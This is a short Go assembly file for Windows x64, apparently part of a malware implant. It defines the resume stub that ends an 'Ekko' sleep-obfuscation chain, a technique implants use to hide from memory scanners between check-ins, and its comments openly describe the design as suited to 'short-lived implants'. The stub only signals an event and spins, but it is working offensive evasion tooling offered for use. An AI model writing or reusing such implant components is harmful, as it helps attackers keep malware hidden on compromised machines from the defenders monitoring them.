// +build windows,amd64

#include "textflag.h"

// func resumeStub()
// The last NtContinue in the Ekko chain lands a pool thread here.
// The thread is not known to the Go runtime — we must NOT enter any
// Go function. Steps:
//   1. Load the resume-event handle from ·ekkoResumeEvent
//   2. Call SetEvent(handle) via ·ekkoProcSetEvent
//   3. Spin forever — we cannot ExitThread here because that would
//      abnormally unwind a Windows thread-pool callback and crash
//      DeleteTimerQueueEx's bookkeeping. The thread pool notices the
//      spin and eventually recycles the worker on its own schedule;
//      the leak is one worker per Cycle, acceptable for short-lived
//      implants and avoids the ExitThread hazard.
//
// Calling convention: Windows x64 — RCX = first arg, shadow space 0x20 on stack.
TEXT ·resumeStub(SB), NOSPLIT|NOFRAME, $0
	SUBQ $0x28, SP
	MOVQ ·ekkoResumeEvent(SB), CX
	MOVQ ·ekkoProcSetEvent(SB), AX
	CALL AX
spin:
	PAUSE
	JMP  spin
